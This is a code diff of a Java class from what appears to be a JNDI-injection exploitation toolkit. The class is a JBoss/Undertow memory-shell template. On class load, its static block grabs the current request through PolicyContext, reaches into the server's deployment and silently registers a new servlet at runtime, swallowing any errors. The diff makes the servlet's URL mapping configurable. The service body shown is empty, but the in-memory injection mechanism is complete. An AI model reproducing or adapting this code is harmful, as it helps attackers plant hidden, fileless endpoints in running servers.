@@ -2,6 +2,7 @@ package com.nu1r.jndi.template.jboss;
 
 
 import io.undertow.servlet.api.DeploymentInfo;
+import io.undertow.servlet.api.FilterInfo;
 import io.undertow.servlet.api.ServletInfo;
 import io.undertow.servlet.core.DeploymentImpl;
 import io.undertow.servlet.handlers.ServletHandler;
@@ -27,10 +28,11 @@ import static org.fusesource.jansi.Ansi.ansi;
  */
 public class JBSMSFromContextS implements Servlet {
 
+    public static String pattern;
+
     static {
         try {
-            String servletName = "nu1r" + System.nanoTime();
-            String urlPattern  = "/nu1r";
+            String servletName = String.valueOf(System.nanoTime());
 
             HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
             ServletContext         context = request.getServletContext();
@@ -55,7 +57,7 @@ public class JBSMSFromContextS implements Servlet {
                 ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);
 
                 ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
-                registration.addMapping(urlPattern);
+                registration.addMapping(pattern);
             }
         } catch (Exception ignored) {
         }
@@ -63,7 +65,6 @@ public class JBSMSFromContextS implements Servlet {
 
     @Override
     public void init(ServletConfig servletConfig) throws ServletException {
-
     }
 
     @Override
@@ -72,8 +73,7 @@ public class JBSMSFromContextS implements Servlet {
     }
 
     @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
     }
 
     @Override
@@ -83,6 +83,5 @@ public class JBSMSFromContextS implements Servlet {
 
     @Override
     public void destroy() {
-
     }
 }
